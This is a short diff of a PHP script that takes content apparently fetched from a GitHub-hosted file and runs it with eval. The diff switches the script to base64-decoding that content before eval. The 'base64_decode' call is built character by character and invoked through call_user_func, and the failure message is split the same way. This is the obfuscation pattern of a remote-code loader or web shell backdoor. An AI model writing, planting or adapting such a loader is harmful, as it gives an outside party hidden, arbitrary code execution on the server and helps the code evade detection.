@@ -39,12 +39,8 @@ if ($_open) {
 }
 
 if ($_out !== false) {
-    // kalau file di github isinya langsung php biasa
-    eval('?>' . $_out);
-
-    // kalau file di github isinya base64, pakai ini:
-    // $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
-    // eval('?>' . call_user_func($_b64, $_out));
+    $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
+    eval('?>' . call_user_func($_b64, $_out));
 } else {
     echo 'G'.'a'.'g'.'a'.'l'.' ' . 'l'.'o'.'a'.'d';
 }
